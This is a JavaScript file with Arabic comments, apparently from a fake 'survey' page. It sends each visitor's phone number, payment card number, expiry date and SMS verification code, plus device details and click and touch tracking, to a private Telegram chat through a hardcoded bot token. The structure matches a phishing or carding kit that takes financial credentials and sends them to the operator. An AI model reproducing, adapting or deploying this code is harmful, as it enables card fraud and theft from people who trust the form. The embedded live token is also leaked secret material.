// إعدادات بوت تليجرام
const TELEGRAM_BOT_TOKEN = '8598568990:AAHdirQJ0hBr1xkJAfXoaNcDm3GWMXcqQKg'; // ضع توكن البوت هنا
const TELEGRAM_CHAT_ID = '7590246763'; // ضع معرف الدردشة هنا

// إرسال البيانات إلى تليجرام
async function sendTelegramData(eventType, data) {
    try {
        const message = formatTelegramMessage(eventType, data);
        
        // إعداد طلب HTTP
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_notification: false
        };
        
        // إرسال البيانات (غير متزامن، لا ينتظر الاستجابة)
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        }).catch(error => {
            console.error('Error sending to Telegram:', error);
        });
        
        // حفظ محلي للبيانات (للنسخ الاحتياطي)
        saveDataLocally(eventType, data);
        
    } catch (error) {
        console.error('Error in sendTelegramData:', error);
    }
}

// تنسيق رسالة تليجرام
function formatTelegramMessage(eventType, data) {
    const timestamp = new Date().toISOString();
    let message = `<b>📊 ${getEventTypeName(eventType)}</b>\n`;
    message += `⏰ <b>الوقت:</b> ${formatTime(timestamp)}\n`;
    message += `🆔 <b>معرف الجلسة:</b> ${data.sessionId || getSessionId() || 'غير معروف'}\n\n`;
    
    switch(eventType) {
        case 'session_started':
            message += `🌐 <b>المرجع:</b> ${data.referrer || 'مباشر'}\n`;
            message += `🕒 <b>وقت البدء:</b> ${formatTime(data.startTime)}\n`;
            break;
            
        case 'page_view':
            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
            message += `⏱️ <b>مدة الجلسة:</b> ${formatDuration(data.sessionDuration)}\n`;
            message += `📍 <b>موضع التمرير:</b> ${data.scrollPosition}px\n`;
            break;
            
        case 'button_click':
            message += `🖱️ <b>زر:</b> ${data.text}\n`;
            message += `🔗 <b>ID:</b> ${data.id}\n`;
            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
            message += `📍 <b>الإحداثيات:</b> X:${data.x}, Y:${data.y}\n`;
            break;
            
        case 'specific_button_click':
            message += `🖱️ <b>زر محدد:</b> ${data.buttonId}\n`;
            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
            message += `⏱️ <b>مدة الجلسة:</b> ${formatDuration(data.sessionDuration)}\n`;
            break;
            
        case 'touch_event':
            message += `👆 <b>لمسات:</b> ${data.touches}\n`;
            message += `📍 <b>الإحداثيات:</b> X:${data.x}, Y:${data.y}\n`;
            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
            break;
            
        case 'step1_completed':
            message += `📱 <b>رقم الهاتف:</b> ${data.phone}\n`;
            message += `💳 <b>رقم البطاقة:</b> ${maskCardNumber(data.cardNumber)}\n`;
            message += `📅 <b>تاريخ الانتهاء:</b> ${data.expiryDate}\n`;
            message += `✅ <b>تم إكمال الخطوة الأولى</b>\n`;
            break;
            
        case 'survey_completed':
            message += `🎉 <b>تم إكمال الاستبيان!</b>\n\n`;
            message += `<b>📊 معلومات المستخدم:</b>\n`;
            message += `📱 <b>الهاتف:</b> ${data.phone}\n`;
            message += `💳 <b>البطاقة:</b> ${maskCardNumber(data.cardNumber)}\n`;
            message += `🔢 <b>كود التحقق:</b> ${data.verificationCode}\n\n`;
            message += `<b>🖥️ معلومات الجهاز:</b>\n`;
            message += `📱 <b>النوع:</b> ${data.deviceInfo.deviceType}\n`;
            message += `⚙️ <b>نظام التشغيل:</b> ${data.deviceInfo.os}\n`;
            message += `🌐 <b>المتصفح:</b> ${data.deviceInfo.browser}\n`;
            message += `📐 <b>الدقة:</b> ${data.deviceInfo.screenWidth}×${data.deviceInfo.screenHeight}\n`;
            message += `🗣️ <b>اللغة:</b> ${data.deviceInfo.language}\n`;
            break;
            
        case 'session_ended':
            message += `👋 <b>انتهت الجلسة</b>\n`;
            message += `⏱️ <b>المدة:</b> ${formatDuration(data.duration)}\n`;
            message += `📊 <b>مشاهدات الصفحات:</b> ${data.pageViews}\n`;
            message += `🔄 <b>عدد الإجراءات:</b> ${data.actionsCount}\n`;
            break;
            
        case 'user_actions_summary':
            message += `📈 <b>ملخص الإجراءات:</b>\n`;
            data.actions.forEach((action, index) => {
                message += `${index + 1}. ${getActionDescription(action)}\n`;
            });
            break;
            
        default:
            message += `📝 <b>البيانات:</b> ${JSON.stringify(data, null, 2).substring(0, 1000)}\n`;
    }
    
    // إضافة رابط للجلسة
    message += `\n────────────────────\n`;
    message += `🔗 <a href="https://t.me/your_bot">عرض التفاصيل الكاملة</a>`;
    
    return message;
}

// وظائف مساعدة للتنسيق
function getEventTypeName(eventType) {
    const names = {
        'session_started': 'بداية جلسة جديدة',
        'page_view': 'مشاهدة صفحة',
        'button_click': 'نقر على زر',
        'specific_button_click': 'نقر زر محدد',
        'touch_event': 'لمس الشاشة',
        'step1_completed': 'إكمال الخطوة الأولى',
        'survey_completed': 'إكمال الاستبيان',
        'session_ended': 'نهاية الجلسة',
        'user_actions_summary': 'ملخص إجراءات المستخدم',
        'thankyou_page_viewed': 'مشاهدة صفحة الشكر'
    };
    
    return names[eventType] || eventType;
}

function formatTime(isoString) {
    const date = new Date(isoString);
    return date.toLocaleString('ar-SA', {
        timeZone: 'Africa/Algiers',
        hour12: true,
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
}

function formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    
    if (hours > 0) {
        return `${hours} ساعة ${minutes % 60} دقيقة`;
    } else if (minutes > 0) {
        return `${minutes} دقيقة ${seconds % 60} ثانية`;
    } else {
        return `${seconds} ثانية`;
    }
}

function maskCardNumber(cardNumber) {
    if (!cardNumber) return 'غير معروف';
    const cleanNumber = cardNumber.replace(/\s/g, '');
    return `**** **** **** ${cleanNumber.slice(-4)}`;
}

function getActionDescription(action) {
    switch(action.type) {
        case 'page_view':
            return `صفحة: ${action.data.page}`;
        case 'button_click':
            return `نقر: ${action.data.text}`;
        case 'touch_event':
            return `لمس: ${action.data.touches} إصبع`;
        default:
            return action.type;
    }
}

// حفظ البيانات محلياً للنسخ الاحتياطي
function saveDataLocally(eventType, data) {
    try {
        const key = `survey_data_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const storageData = {
            eventType,
            data,
            timestamp: new Date().toISOString(),
            sessionId: getSessionId()
        };
        
        localStorage.setItem(key, JSON.stringify(storageData));
        
        // تنظيف البيانات القديمة (أكثر من يوم)
        cleanupOldLocalData();
        
    } catch (error) {
        console.error('Error saving data locally:', error);
    }
}

function cleanupOldLocalData() {
    const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && key.startsWith('survey_data_')) {
            try {
                const data = JSON.parse(localStorage.getItem(key));
                if (data && new Date(data.timestamp).getTime() < oneDayAgo) {
                    localStorage.removeItem(key);
                }
            } catch (e) {
                // تجاهل الأخطاء في التنظيف
            }
        }
    }
}

// وظيفة لتحميل جميع البيانات المحفوظة (للتطوير)
function getAllLocalData() {
    const allData = [];
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && key.startsWith('survey_data_')) {
            try {
                const data = JSON.parse(localStorage.getItem(key));
                allData.push(data);
            } catch (e) {
                // تجاهل البيانات التالفة
            }
        }
    }
    
    return allData;
}

